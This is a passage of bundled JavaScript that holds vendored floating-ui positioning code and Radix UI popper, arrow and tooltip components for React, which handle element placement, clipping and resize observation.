  const y = top * scale.y;
  return {
    width,
    height,
    x,
    y
  };
}
function getClientRectFromClippingAncestor(element, clippingAncestor, strategy) {
  let rect;
  if (clippingAncestor === "viewport") {
    rect = getViewportRect(element, strategy);
  } else if (clippingAncestor === "document") {
    rect = getDocumentRect(getDocumentElement(element));
  } else if (isElement(clippingAncestor)) {
    rect = getInnerBoundingClientRect(clippingAncestor, strategy);
  } else {
    const visualOffsets = getVisualOffsets(element);
    rect = {
      x: clippingAncestor.x - visualOffsets.x,
      y: clippingAncestor.y - visualOffsets.y,
      width: clippingAncestor.width,
      height: clippingAncestor.height
    };
  }
  return rectToClientRect(rect);
}
function hasFixedPositionAncestor(element, stopNode) {
  const parentNode = getParentNode(element);
  if (parentNode === stopNode || !isElement(parentNode) || isLastTraversableNode(parentNode)) {
    return false;
  }
  return getComputedStyle2(parentNode).position === "fixed" || hasFixedPositionAncestor(parentNode, stopNode);
}
function getClippingElementAncestors(element, cache) {
  const cachedResult = cache.get(element);
  if (cachedResult) {
    return cachedResult;
  }
  let result = getOverflowAncestors(element, [], false).filter((el) => isElement(el) && getNodeName(el) !== "body");
  let currentContainingBlockComputedStyle = null;
  const elementIsFixed = getComputedStyle2(element).position === "fixed";
  let currentNode = elementIsFixed ? getParentNode(element) : element;
  while (isElement(currentNode) && !isLastTraversableNode(currentNode)) {
    const computedStyle = getComputedStyle2(currentNode);
    const currentNodeIsContaining = isContainingBlock(currentNode);
    if (!currentNodeIsContaining && computedStyle.position === "fixed") {
      currentContainingBlockComputedStyle = null;
    }
    const shouldDropCurrentNode = elementIsFixed ? !currentNodeIsContaining && !currentContainingBlockComputedStyle : !currentNodeIsContaining && computedStyle.position === "static" && !!currentContainingBlockComputedStyle && absoluteOrFixed.has(currentContainingBlockComputedStyle.position) || isOverflowElement(currentNode) && !currentNodeIsContaining && hasFixedPositionAncestor(element, currentNode);
    if (shouldDropCurrentNode) {
      result = result.filter((ancestor) => ancestor !== currentNode);
    } else {
      currentContainingBlockComputedStyle = computedStyle;
    }
    currentNode = getParentNode(currentNode);
  }
  cache.set(element, result);
  return result;
}
function getClippingRect(_ref) {
  let {
    element,
    boundary,
    rootBoundary,
    strategy
  } = _ref;
  const elementClippingAncestors = boundary === "clippingAncestors" ? isTopLayer(element) ? [] : getClippingElementAncestors(element, this._c) : [].concat(boundary);
  const clippingAncestors = [...elementClippingAncestors, rootBoundary];
  const firstClippingAncestor = clippingAncestors[0];
  const clippingRect = clippingAncestors.reduce((accRect, clippingAncestor) => {
    const rect = getClientRectFromClippingAncestor(element, clippingAncestor, strategy);
    accRect.top = max(rect.top, accRect.top);
    accRect.right = min(rect.right, accRect.right);
    accRect.bottom = min(rect.bottom, accRect.bottom);
    accRect.left = max(rect.left, accRect.left);
    return accRect;
  }, getClientRectFromClippingAncestor(element, firstClippingAncestor, strategy));
  return {
    width: clippingRect.right - clippingRect.left,
    height: clippingRect.bottom - clippingRect.top,
    x: clippingRect.left,
    y: clippingRect.top
  };
}
function getDimensions(element) {
  const {
    width,
    height
  } = getCssDimensions(element);
  return {
    width,
    height
  };
}
function getRectRelativeToOffsetParent(element, offsetParent, strategy) {
  const isOffsetParentAnElement = isHTMLElement2(offsetParent);
  const documentElement = getDocumentElement(offsetParent);
  const isFixed = strategy === "fixed";
  const rect = getBoundingClientRect(element, true, isFixed, offsetParent);
  let scroll = {
    scrollLeft: 0,
    scrollTop: 0
  };
  const offsets = createCoords(0);
  function setLeftRTLScrollbarOffset() {
    offsets.x = getWindowScrollBarX(documentElement);
  }
  if (isOffsetParentAnElement || !isOffsetParentAnElement && !isFixed) {
    if (getNodeName(offsetParent) !== "body" || isOverflowElement(documentElement)) {
      scroll = getNodeScroll(offsetParent);
    }
    if (isOffsetParentAnElement) {
      const offsetRect = getBoundingClientRect(offsetParent, true, isFixed, offsetParent);
      offsets.x = offsetRect.x + offsetParent.clientLeft;
      offsets.y = offsetRect.y + offsetParent.clientTop;
    } else if (documentElement) {
      setLeftRTLScrollbarOffset();
    }
  }
  if (isFixed && !isOffsetParentAnElement && documentElement) {
    setLeftRTLScrollbarOffset();
  }
  const htmlOffset = documentElement && !isOffsetParentAnElement && !isFixed ? getHTMLOffset(documentElement, scroll) : createCoords(0);
  const x = rect.left + scroll.scrollLeft - offsets.x - htmlOffset.x;
  const y = rect.top + scroll.scrollTop - offsets.y - htmlOffset.y;
  return {
    x,
    y,
    width: rect.width,
    height: rect.height
  };
}
function isStaticPositioned(element) {
  return getComputedStyle2(element).position === "static";
}
function getTrueOffsetParent(element, polyfill) {
  if (!isHTMLElement2(element) || getComputedStyle2(element).position === "fixed") {
    return null;
  }
  if (polyfill) {
    return polyfill(element);
  }
  let rawOffsetParent = element.offsetParent;
  if (getDocumentElement(element) === rawOffsetParent) {
    rawOffsetParent = rawOffsetParent.ownerDocument.body;
  }
  return rawOffsetParent;
}
function getOffsetParent(element, polyfill) {
  const win = getWindow(element);
  if (isTopLayer(element)) {
    return win;
  }
  if (!isHTMLElement2(element)) {
    let svgOffsetParent = getParentNode(element);
    while (svgOffsetParent && !isLastTraversableNode(svgOffsetParent)) {
      if (isElement(svgOffsetParent) && !isStaticPositioned(svgOffsetParent)) {
        return svgOffsetParent;
      }
      svgOffsetParent = getParentNode(svgOffsetParent);
    }
    return win;
  }
  let offsetParent = getTrueOffsetParent(element, polyfill);
  while (offsetParent && isTableElement(offsetParent) && isStaticPositioned(offsetParent)) {
    offsetParent = getTrueOffsetParent(offsetParent, polyfill);
  }
  if (offsetParent && isLastTraversableNode(offsetParent) && isStaticPositioned(offsetParent) && !isContainingBlock(offsetParent)) {
    return win;
  }
  return offsetParent || getContainingBlock(element) || win;
}
var getElementRects = async function(data) {
  const getOffsetParentFn = this.getOffsetParent || getOffsetParent;
  const getDimensionsFn = this.getDimensions;
  const floatingDimensions = await getDimensionsFn(data.floating);
  return {
    reference: getRectRelativeToOffsetParent(data.reference, await getOffsetParentFn(data.floating), data.strategy),
    floating: {
      x: 0,
      y: 0,
      width: floatingDimensions.width,
      height: floatingDimensions.height
    }
  };
};
function isRTL(element) {
  return getComputedStyle2(element).direction === "rtl";
}
var platform = {
  convertOffsetParentRelativeRectToViewportRelativeRect,
  getDocumentElement,
  getClippingRect,
  getOffsetParent,
  getElementRects,
  getClientRects,
  getDimensions,
  getScale,
  isElement,
  isRTL
};
function rectsAreEqual(a, b) {
  return a.x === b.x && a.y === b.y && a.width === b.width && a.height === b.height;
}
function observeMove(element, onMove) {
  let io = null;
  let timeoutId;
  const root = getDocumentElement(element);
  function cleanup() {
    var _io;
    clearTimeout(timeoutId);
    (_io = io) == null || _io.disconnect();
    io = null;
  }
  function refresh(skip, threshold) {
    if (skip === void 0) {
      skip = false;
    }
    if (threshold === void 0) {
      threshold = 1;
    }
    cleanup();
    const elementRectForRootMargin = element.getBoundingClientRect();
    const {
      left,
      top,
      width,
      height
    } = elementRectForRootMargin;
    if (!skip) {
      onMove();
    }
    if (!width || !height) {
      return;
    }
    const insetTop = floor(top);
    const insetRight = floor(root.clientWidth - (left + width));
    const insetBottom = floor(root.clientHeight - (top + height));
    const insetLeft = floor(left);
    const rootMargin = -insetTop + "px " + -insetRight + "px " + -insetBottom + "px " + -insetLeft + "px";
    const options = {
      rootMargin,
      threshold: max(0, min(1, threshold)) || 1
    };
    let isFirstUpdate = true;
    function handleObserve(entries) {
      const ratio = entries[0].intersectionRatio;
      if (ratio !== threshold) {
        if (!isFirstUpdate) {
          return refresh();
        }
        if (!ratio) {
          timeoutId = setTimeout(() => {
            refresh(false, 1e-7);
          }, 1e3);
        } else {
          refresh(false, ratio);
        }
      }
      if (ratio === 1 && !rectsAreEqual(elementRectForRootMargin, element.getBoundingClientRect())) {
        refresh();
      }
      isFirstUpdate = false;
    }
    try {
      io = new IntersectionObserver(handleObserve, {
        ...options,
        // Handle <iframe>s
        root: root.ownerDocument
      });
    } catch (_e) {
      io = new IntersectionObserver(handleObserve, options);
    }
    io.observe(element);
  }
  refresh(true);
  return cleanup;
}
function autoUpdate(reference, floating, update, options) {
  if (options === void 0) {
    options = {};
  }
  const {
    ancestorScroll = true,
    ancestorResize = true,
    elementResize = typeof ResizeObserver === "function",
    layoutShift = typeof IntersectionObserver === "function",
    animationFrame = false
  } = options;
  const referenceEl = unwrapElement(reference);
  const ancestors = ancestorScroll || ancestorResize ? [...referenceEl ? getOverflowAncestors(referenceEl) : [], ...getOverflowAncestors(floating)] : [];
  ancestors.forEach((ancestor) => {
    ancestorScroll && ancestor.addEventListener("scroll", update, {
      passive: true
    });
    ancestorResize && ancestor.addEventListener("resize", update);
  });
  const cleanupIo = referenceEl && layoutShift ? observeMove(referenceEl, update) : null;
  let reobserveFrame = -1;
  let resizeObserver = null;
  if (elementResize) {
    resizeObserver = new ResizeObserver((_ref) => {
      let [firstEntry] = _ref;
      if (firstEntry && firstEntry.target === referenceEl && resizeObserver) {
        resizeObserver.unobserve(floating);
        cancelAnimationFrame(reobserveFrame);
        reobserveFrame = requestAnimationFrame(() => {
          var _resizeObserver;
          (_resizeObserver = resizeObserver) == null || _resizeObserver.observe(floating);
        });
      }
      update();
    });
    if (referenceEl && !animationFrame) {
      resizeObserver.observe(referenceEl);
    }
    resizeObserver.observe(floating);
  }
  let frameId;
  let prevRefRect = animationFrame ? getBoundingClientRect(reference) : null;
  if (animationFrame) {
    frameLoop();
  }
  function frameLoop() {
    const nextRefRect = getBoundingClientRect(reference);
    if (prevRefRect && !rectsAreEqual(prevRefRect, nextRefRect)) {
      update();
    }
    prevRefRect = nextRefRect;
    frameId = requestAnimationFrame(frameLoop);
  }
  update();
  return () => {
    var _resizeObserver2;
    ancestors.forEach((ancestor) => {
      ancestorScroll && ancestor.removeEventListener("scroll", update);
      ancestorResize && ancestor.removeEventListener("resize", update);
    });
    cleanupIo == null || cleanupIo();
    (_resizeObserver2 = resizeObserver) == null || _resizeObserver2.disconnect();
    resizeObserver = null;
    if (animationFrame) {
      cancelAnimationFrame(frameId);
    }
  };
}
var offset2 = offset;
var shift2 = shift;
var flip2 = flip;
var size2 = size;
var hide2 = hide;
var arrow2 = arrow;
var limitShift2 = limitShift;
var computePosition2 = (reference, floating, options) => {
  const cache = /* @__PURE__ */ new Map();
  const mergedOptions = {
    platform,
    ...options
  };
  const platformWithCache = {
    ...mergedOptions.platform,
    _c: cache
  };
  return computePosition(reference, floating, {
    ...mergedOptions,
    platform: platformWithCache
  });
};

// node_modules/@floating-ui/react-dom/dist/floating-ui.react-dom.mjs
import * as React28 from "react";
import { useLayoutEffect as useLayoutEffect3 } from "react";
import * as ReactDOM4 from "react-dom";
var isClient = typeof document !== "undefined";
var noop2 = function noop3() {
};
var index = isClient ? useLayoutEffect3 : noop2;
function deepEqual(a, b) {
  if (a === b) {
    return true;
  }
  if (typeof a !== typeof b) {
    return false;
  }
  if (typeof a === "function" && a.toString() === b.toString()) {
    return true;
  }
  let length;
  let i;
  let keys;
  if (a && b && typeof a === "object") {
    if (Array.isArray(a)) {
      length = a.length;
      if (length !== b.length) return false;
      for (i = length; i-- !== 0; ) {
        if (!deepEqual(a[i], b[i])) {
          return false;
        }
      }
      return true;
    }
    keys = Object.keys(a);
    length = keys.length;
    if (length !== Object.keys(b).length) {
      return false;
    }
    for (i = length; i-- !== 0; ) {
      if (!{}.hasOwnProperty.call(b, keys[i])) {
        return false;
      }
    }
    for (i = length; i-- !== 0; ) {
      const key = keys[i];
      if (key === "_owner" && a.$$typeof) {
        continue;
      }
      if (!deepEqual(a[key], b[key])) {
        return false;
      }
    }
    return true;
  }
  return a !== a && b !== b;
}
function getDPR(element) {
  if (typeof window === "undefined") {
    return 1;
  }
  const win = element.ownerDocument.defaultView || window;
  return win.devicePixelRatio || 1;
}
function roundByDPR(element, value) {
  const dpr = getDPR(element);
  return Math.round(value * dpr) / dpr;
}
function useLatestRef(value) {
  const ref = React28.useRef(value);
  index(() => {
    ref.current = value;
  });
  return ref;
}
function useFloating(options) {
  if (options === void 0) {
    options = {};
  }
  const {
    placement = "bottom",
    strategy = "absolute",
    middleware = [],
    platform: platform2,
    elements: {
      reference: externalReference,
      floating: externalFloating
    } = {},
    transform = true,
    whileElementsMounted,
    open
  } = options;
  const [data, setData] = React28.useState({
    x: 0,
    y: 0,
    strategy,
    placement,
    middlewareData: {},
    isPositioned: false
  });
  const [latestMiddleware, setLatestMiddleware] = React28.useState(middleware);
  if (!deepEqual(latestMiddleware, middleware)) {
    setLatestMiddleware(middleware);
  }
  const [_reference, _setReference] = React28.useState(null);
  const [_floating, _setFloating] = React28.useState(null);
  const setReference = React28.useCallback((node) => {
    if (node !== referenceRef.current) {
      referenceRef.current = node;
      _setReference(node);
    }
  }, []);
  const setFloating = React28.useCallback((node) => {
    if (node !== floatingRef.current) {
      floatingRef.current = node;
      _setFloating(node);
    }
  }, []);
  const referenceEl = externalReference || _reference;
  const floatingEl = externalFloating || _floating;
  const referenceRef = React28.useRef(null);
  const floatingRef = React28.useRef(null);
  const dataRef = React28.useRef(data);
  const hasWhileElementsMounted = whileElementsMounted != null;
  const whileElementsMountedRef = useLatestRef(whileElementsMounted);
  const platformRef = useLatestRef(platform2);
  const openRef = useLatestRef(open);
  const update = React28.useCallback(() => {
    if (!referenceRef.current || !floatingRef.current) {
      return;
    }
    const config = {
      placement,
      strategy,
      middleware: latestMiddleware
    };
    if (platformRef.current) {
      config.platform = platformRef.current;
    }
    computePosition2(referenceRef.current, floatingRef.current, config).then((data2) => {
      const fullData = {
        ...data2,
        // The floating element's position may be recomputed while it's closed
        // but still mounted (such as when transitioning out). To ensure
        // `isPositioned` will be `false` initially on the next open, avoid
        // setting it to `true` when `open === false` (must be specified).
        isPositioned: openRef.current !== false
      };
      if (isMountedRef.current && !deepEqual(dataRef.current, fullData)) {
        dataRef.current = fullData;
        ReactDOM4.flushSync(() => {
          setData(fullData);
        });
      }
    });
  }, [latestMiddleware, placement, strategy, platformRef, openRef]);
  index(() => {
    if (open === false && dataRef.current.isPositioned) {
      dataRef.current.isPositioned = false;
      setData((data2) => ({
        ...data2,
        isPositioned: false
      }));
    }
  }, [open]);
  const isMountedRef = React28.useRef(false);
  index(() => {
    isMountedRef.current = true;
    return () => {
      isMountedRef.current = false;
    };
  }, []);
  index(() => {
    if (referenceEl) referenceRef.current = referenceEl;
    if (floatingEl) floatingRef.current = floatingEl;
    if (referenceEl && floatingEl) {
      if (whileElementsMountedRef.current) {
        return whileElementsMountedRef.current(referenceEl, floatingEl, update);
      }
      update();
    }
  }, [referenceEl, floatingEl, update, whileElementsMountedRef, hasWhileElementsMounted]);
  const refs = React28.useMemo(() => ({
    reference: referenceRef,
    floating: floatingRef,
    setReference,
    setFloating
  }), [setReference, setFloating]);
  const elements = React28.useMemo(() => ({
    reference: referenceEl,
    floating: floatingEl
  }), [referenceEl, floatingEl]);
  const floatingStyles = React28.useMemo(() => {
    const initialStyles = {
      position: strategy,
      left: 0,
      top: 0
    };
    if (!elements.floating) {
      return initialStyles;
    }
    const x = roundByDPR(elements.floating, data.x);
    const y = roundByDPR(elements.floating, data.y);
    if (transform) {
      return {
        ...initialStyles,
        transform: "translate(" + x + "px, " + y + "px)",
        ...getDPR(elements.floating) >= 1.5 && {
          willChange: "transform"
        }
      };
    }
    return {
      position: strategy,
      left: x,
      top: y
    };
  }, [strategy, transform, elements.floating, data.x, data.y]);
  return React28.useMemo(() => ({
    ...data,
    update,
    refs,
    elements,
    floatingStyles
  }), [data, update, refs, elements, floatingStyles]);
}
var arrow$1 = (options) => {
  function isRef(value) {
    return {}.hasOwnProperty.call(value, "current");
  }
  return {
    name: "arrow",
    options,
    fn(state) {
      const {
        element,
        padding
      } = typeof options === "function" ? options(state) : options;
      if (element && isRef(element)) {
        if (element.current != null) {
          return arrow2({
            element: element.current,
            padding
          }).fn(state);
        }
        return {};
      }
      if (element) {
        return arrow2({
          element,
          padding
        }).fn(state);
      }
      return {};
    }
  };
};
var offset3 = (options, deps) => ({
  ...offset2(options),
  options: [options, deps]
});
var shift3 = (options, deps) => ({
  ...shift2(options),
  options: [options, deps]
});
var limitShift3 = (options, deps) => ({
  ...limitShift2(options),
  options: [options, deps]
});
var flip3 = (options, deps) => ({
  ...flip2(options),
  options: [options, deps]
});
var size3 = (options, deps) => ({
  ...size2(options),
  options: [options, deps]
});
var hide3 = (options, deps) => ({
  ...hide2(options),
  options: [options, deps]
});
var arrow3 = (options, deps) => ({
  ...arrow$1(options),
  options: [options, deps]
});

// node_modules/@radix-ui/react-arrow/dist/index.mjs
import * as React29 from "react";
import { jsx as jsx13 } from "react/jsx-runtime";
var NAME2 = "Arrow";
var Arrow = React29.forwardRef((props, forwardedRef) => {
  const { children, width = 10, height = 5, ...arrowProps } = props;
  return /* @__PURE__ */ jsx13(
    Primitive.svg,
    {
      ...arrowProps,
      ref: forwardedRef,
      width,
      height,
      viewBox: "0 0 30 10",
      preserveAspectRatio: "none",
      children: props.asChild ? children : /* @__PURE__ */ jsx13("polygon", { points: "0,0 30,0 15,10" })
    }
  );
});
Arrow.displayName = NAME2;
var Root3 = Arrow;

// node_modules/@radix-ui/react-use-size/dist/index.mjs
import * as React30 from "react";
function useSize(element) {
  const [size4, setSize] = React30.useState(void 0);
  useLayoutEffect22(() => {
    if (element) {
      setSize({ width: element.offsetWidth, height: element.offsetHeight });
      const resizeObserver = new ResizeObserver((entries) => {
        if (!Array.isArray(entries)) {
          return;
        }
        if (!entries.length) {
          return;
        }
        const entry = entries[0];
        let width;
        let height;
        if ("borderBoxSize" in entry) {
          const borderSizeEntry = entry["borderBoxSize"];
          const borderSize = Array.isArray(borderSizeEntry) ? borderSizeEntry[0] : borderSizeEntry;
          width = borderSize["inlineSize"];
          height = borderSize["blockSize"];
        } else {
          width = element.offsetWidth;
          height = element.offsetHeight;
        }
        setSize({ width, height });
      });
      resizeObserver.observe(element, { box: "border-box" });
      return () => resizeObserver.unobserve(element);
    } else {
      setSize(void 0);
    }
  }, [element]);
  return size4;
}

// node_modules/@radix-ui/react-popper/dist/index.mjs
import { jsx as jsx14 } from "react/jsx-runtime";
var POPPER_NAME = "Popper";
var [createPopperContext, createPopperScope] = createContextScope(POPPER_NAME);
var [PopperProvider, usePopperContext] = createPopperContext(POPPER_NAME);
var Popper = (props) => {
  const { __scopePopper, children } = props;
  const [anchor, setAnchor] = React31.useState(null);
  return /* @__PURE__ */ jsx14(PopperProvider, { scope: __scopePopper, anchor, onAnchorChange: setAnchor, children });
};
Popper.displayName = POPPER_NAME;
var ANCHOR_NAME = "PopperAnchor";
var PopperAnchor = React31.forwardRef(
  (props, forwardedRef) => {
    const { __scopePopper, virtualRef, ...anchorProps } = props;
    const context = usePopperContext(ANCHOR_NAME, __scopePopper);
    const ref = React31.useRef(null);
    const composedRefs = useComposedRefs(forwardedRef, ref);
    React31.useEffect(() => {
      context.onAnchorChange(virtualRef?.current || ref.current);
    });
    return virtualRef ? null : /* @__PURE__ */ jsx14(Primitive.div, { ...anchorProps, ref: composedRefs });
  }
);
PopperAnchor.displayName = ANCHOR_NAME;
var CONTENT_NAME = "PopperContent";
var [PopperContentProvider, useContentContext] = createPopperContext(CONTENT_NAME);
var PopperContent = React31.forwardRef(
  (props, forwardedRef) => {
    const {
      __scopePopper,
      side = "bottom",
      sideOffset = 0,
      align = "center",
      alignOffset = 0,
      arrowPadding = 0,
      avoidCollisions = true,
      collisionBoundary = [],
      collisionPadding: collisionPaddingProp = 0,
      sticky = "partial",
      hideWhenDetached = false,
      updatePositionStrategy = "optimized",
      onPlaced,
      ...contentProps
    } = props;
    const context = usePopperContext(CONTENT_NAME, __scopePopper);
    const [content, setContent] = React31.useState(null);
    const composedRefs = useComposedRefs(forwardedRef, (node) => setContent(node));
    const [arrow4, setArrow] = React31.useState(null);
    const arrowSize = useSize(arrow4);
    const arrowWidth = arrowSize?.width ?? 0;
    const arrowHeight = arrowSize?.height ?? 0;
    const desiredPlacement = side + (align !== "center" ? "-" + align : "");
    const collisionPadding = typeof collisionPaddingProp === "number" ? collisionPaddingProp : { top: 0, right: 0, bottom: 0, left: 0, ...collisionPaddingProp };
    const boundary = Array.isArray(collisionBoundary) ? collisionBoundary : [collisionBoundary];
    const hasExplicitBoundaries = boundary.length > 0;
    const detectOverflowOptions = {
      padding: collisionPadding,
      boundary: boundary.filter(isNotNull),
      // with `strategy: 'fixed'`, this is the only way to get it to respect boundaries
      altBoundary: hasExplicitBoundaries
    };
    const { refs, floatingStyles, placement, isPositioned, middlewareData } = useFloating({
      // default to `fixed` strategy so users don't have to pick and we also avoid focus scroll issues
      strategy: "fixed",
      placement: desiredPlacement,
      whileElementsMounted: (...args) => {
        const cleanup = autoUpdate(...args, {
          animationFrame: updatePositionStrategy === "always"
        });
        return cleanup;
      },
      elements: {
        reference: context.anchor
      },
      middleware: [
        offset3({ mainAxis: sideOffset + arrowHeight, alignmentAxis: alignOffset }),
        avoidCollisions && shift3({
          mainAxis: true,
          crossAxis: false,
          limiter: sticky === "partial" ? limitShift3() : void 0,
          ...detectOverflowOptions
        }),
        avoidCollisions && flip3({ ...detectOverflowOptions }),
        size3({
          ...detectOverflowOptions,
          apply: ({ elements, rects, availableWidth, availableHeight }) => {
            const { width: anchorWidth, height: anchorHeight } = rects.reference;
            const contentStyle = elements.floating.style;
            contentStyle.setProperty("--radix-popper-available-width", `${availableWidth}px`);
            contentStyle.setProperty("--radix-popper-available-height", `${availableHeight}px`);
            contentStyle.setProperty("--radix-popper-anchor-width", `${anchorWidth}px`);
            contentStyle.setProperty("--radix-popper-anchor-height", `${anchorHeight}px`);
          }
        }),
        arrow4 && arrow3({ element: arrow4, padding: arrowPadding }),
        transformOrigin({ arrowWidth, arrowHeight }),
        hideWhenDetached && hide3({ strategy: "referenceHidden", ...detectOverflowOptions })
      ]
    });
    const [placedSide, placedAlign] = getSideAndAlignFromPlacement(placement);
    const handlePlaced = useCallbackRef(onPlaced);
    useLayoutEffect22(() => {
      if (isPositioned) {
        handlePlaced?.();
      }
    }, [isPositioned, handlePlaced]);
    const arrowX = middlewareData.arrow?.x;
    const arrowY = middlewareData.arrow?.y;
    const cannotCenterArrow = middlewareData.arrow?.centerOffset !== 0;
    const [contentZIndex, setContentZIndex] = React31.useState();
    useLayoutEffect22(() => {
      if (content) setContentZIndex(window.getComputedStyle(content).zIndex);
    }, [content]);
    return /* @__PURE__ */ jsx14(
      "div",
      {
        ref: refs.setFloating,
        "data-radix-popper-content-wrapper": "",
        style: {
          ...floatingStyles,
          transform: isPositioned ? floatingStyles.transform : "translate(0, -200%)",
          // keep off the page when measuring
          minWidth: "max-content",
          zIndex: contentZIndex,
          ["--radix-popper-transform-origin"]: [
            middlewareData.transformOrigin?.x,
            middlewareData.transformOrigin?.y
          ].join(" "),
          // hide the content if using the hide middleware and should be hidden
          // set visibility to hidden and disable pointer events so the UI behaves
          // as if the PopperContent isn't there at all
          ...middlewareData.hide?.referenceHidden && {
            visibility: "hidden",
            pointerEvents: "none"
          }
        },
        dir: props.dir,
        children: /* @__PURE__ */ jsx14(
          PopperContentProvider,
          {
            scope: __scopePopper,
            placedSide,
            onArrowChange: setArrow,
            arrowX,
            arrowY,
            shouldHideArrow: cannotCenterArrow,
            children: /* @__PURE__ */ jsx14(
              Primitive.div,
              {
                "data-side": placedSide,
                "data-align": placedAlign,
                ...contentProps,
                ref: composedRefs,
                style: {
                  ...contentProps.style,
                  // if the PopperContent hasn't been placed yet (not all measurements done)
                  // we prevent animations so that users's animation don't kick in too early referring wrong sides
                  animation: !isPositioned ? "none" : void 0
                }
              }
            )
          }
        )
      }
    );
  }
);
PopperContent.displayName = CONTENT_NAME;
var ARROW_NAME = "PopperArrow";
var OPPOSITE_SIDE = {
  top: "bottom",
  right: "left",
  bottom: "top",
  left: "right"
};
var PopperArrow = React31.forwardRef(function PopperArrow2(props, forwardedRef) {
  const { __scopePopper, ...arrowProps } = props;
  const contentContext = useContentContext(ARROW_NAME, __scopePopper);
  const baseSide = OPPOSITE_SIDE[contentContext.placedSide];
  return (
    // we have to use an extra wrapper because `ResizeObserver` (used by `useSize`)
    // doesn't report size as we'd expect on SVG elements.
    // it reports their bounding box which is effectively the largest path inside the SVG.
    /* @__PURE__ */ jsx14(
      "span",
      {
        ref: contentContext.onArrowChange,
        style: {
          position: "absolute",
          left: contentContext.arrowX,
          top: contentContext.arrowY,
          [baseSide]: 0,
          transformOrigin: {
            top: "",
            right: "0 0",
            bottom: "center 0",
            left: "100% 0"
          }[contentContext.placedSide],
          transform: {
            top: "translateY(100%)",
            right: "translateY(50%) rotate(90deg) translateX(-50%)",
            bottom: `rotate(180deg)`,
            left: "translateY(50%) rotate(-90deg) translateX(50%)"
          }[contentContext.placedSide],
          visibility: contentContext.shouldHideArrow ? "hidden" : void 0
        },
        children: /* @__PURE__ */ jsx14(
          Root3,
          {
            ...arrowProps,
            ref: forwardedRef,
            style: {
              ...arrowProps.style,
              // ensures the element can be measured correctly (mostly for if SVG)
              display: "block"
            }
          }
        )
      }
    )
  );
});
PopperArrow.displayName = ARROW_NAME;
function isNotNull(value) {
  return value !== null;
}
var transformOrigin = (options) => ({
  name: "transformOrigin",
  options,
  fn(data) {
    const { placement, rects, middlewareData } = data;
    const cannotCenterArrow = middlewareData.arrow?.centerOffset !== 0;
    const isArrowHidden = cannotCenterArrow;
    const arrowWidth = isArrowHidden ? 0 : options.arrowWidth;
    const arrowHeight = isArrowHidden ? 0 : options.arrowHeight;
    const [placedSide, placedAlign] = getSideAndAlignFromPlacement(placement);
    const noArrowAlign = { start: "0%", center: "50%", end: "100%" }[placedAlign];
    const arrowXCenter = (middlewareData.arrow?.x ?? 0) + arrowWidth / 2;
    const arrowYCenter = (middlewareData.arrow?.y ?? 0) + arrowHeight / 2;
    let x = "";
    let y = "";
    if (placedSide === "bottom") {
      x = isArrowHidden ? noArrowAlign : `${arrowXCenter}px`;
      y = `${-arrowHeight}px`;
    } else if (placedSide === "top") {
      x = isArrowHidden ? noArrowAlign : `${arrowXCenter}px`;
      y = `${rects.floating.height + arrowHeight}px`;
    } else if (placedSide === "right") {
      x = `${-arrowHeight}px`;
      y = isArrowHidden ? noArrowAlign : `${arrowYCenter}px`;
    } else if (placedSide === "left") {
      x = `${rects.floating.width + arrowHeight}px`;
      y = isArrowHidden ? noArrowAlign : `${arrowYCenter}px`;
    }
    return { data: { x, y } };
  }
});
function getSideAndAlignFromPlacement(placement) {
  const [side, align = "center"] = placement.split("-");
  return [side, align];
}
var Root23 = Popper;
var Anchor = PopperAnchor;
var Content = PopperContent;
var Arrow2 = PopperArrow;

// node_modules/@radix-ui/react-tooltip/dist/index.mjs
import { jsx as jsx15, jsxs as jsxs3 } from "react/jsx-runtime";
var [createTooltipContext, createTooltipScope] = createContextScope("Tooltip", [
  createPopperScope
]);
var usePopperScope = createPopperScope();
var PROVIDER_NAME2 = "TooltipProvider";
var DEFAULT_DELAY_DURATION = 700;
var TOOLTIP_OPEN = "tooltip.open";
var [TooltipProviderContextProvider, useTooltipProviderContext] = createTooltipContext(PROVIDER_NAME2);
var TooltipProvider = (props) => {
  const {
    __scopeTooltip,
    delayDuration = DEFAULT_DELAY_DURATION,
    skipDelayDuration = 300,
    disableHoverableContent = false,
    children
  } = props;
  const isOpenDelayedRef = React32.useRef(true);
  const isPointerInTransitRef = React32.useRef(false);
  const skipDelayTimerRef = React32.useRef(0);
  React32.useEffect(() => {
    const skipDelayTimer = skipDelayTimerRef.current;
    return () => window.clearTimeout(skipDelayTimer);
  }, []);
  return /* @__PURE__ */ jsx15(
    TooltipProviderContextProvider,
    {
      scope: __scopeTooltip,
      isOpenDelayedRef,
      delayDuration,
      onOpen: React32.useCallback(() => {
        window.clearTimeout(skipDelayTimerRef.current);
        isOpenDelayedRef.current = false;
      }, []),
      onClose: React32.useCallback(() => {
        window.clearTimeout(skipDelayTimerRef.current);
        skipDelayTimerRef.current = window.setTimeout(
          () => isOpenDelayedRef.current = true,
          skipDelayDuration
        );
      }, [skipDelayDuration]),
      isPointerInTransitRef,
      onPointerInTransitChange: React32.useCallback((inTransit) => {
        isPointerInTransitRef.current = inTransit;
      }, []),
      disableHoverableContent,
      children
    }
  );
};
TooltipProvider.displayName = PROVIDER_NAME2;
var TOOLTIP_NAME = "Tooltip";
var [TooltipContextProvider, useTooltipContext] = createTooltipContext(TOOLTIP_NAME);
var Tooltip = (props) => {
  const {
    __scopeTooltip,
    children,
    open: openProp,
    defaultOpen,
    onOpenChange,
    disableHoverableContent: disableHoverableContentProp,
    delayDuration: delayDurationProp
  } = props;
  const providerContext = useTooltipProviderContext(TOOLTIP_NAME, props.__scopeTooltip);
  const popperScope = usePopperScope(__scopeTooltip);
  const [trigger, setTrigger] = React32.useState(null);
  const contentId = useId();
  const openTimerRef = React32.useRef(0);
  const disableHoverableContent = disableHoverableContentProp ?? providerContext.disableHoverableContent;
  const delayDuration = delayDurationProp ?? providerContext.delayDuration;
  const wasOpenDelayedRef = React32.useRef(false);
  const [open, setOpen] = useControllableState({
    prop: openProp,
    defaultProp: defaultOpen ?? false,
    onChange: (open2) => {
      if (open2) {
        providerContext.onOpen();
        document.dispatchEvent(new CustomEvent(TOOLTIP_OPEN));
      } else {
        providerContext.onClose();
      }
      onOpenChange?.(open2);
    },
    caller: TOOLTIP_NAME
  });
  const stateAttribute = React32.useMemo(() => {
    return open ? wasOpenDelayedRef.current ? "delayed-open" : "instant-open" : "closed";
  }, [open]);
  const handleOpen = React32.useCallback(() => {
    window.clearTimeout(openTimerRef.current);
    openTimerRef.current = 0;
    wasOpenDelayedRef.current = false;
    setOpen(true);
  }, [setOpen]);
  const handleClose = React32.useCallback(() => {
    window.clearTimeout(openTimerRef.current);
    openTimerRef.current = 0;
    setOpen(false);
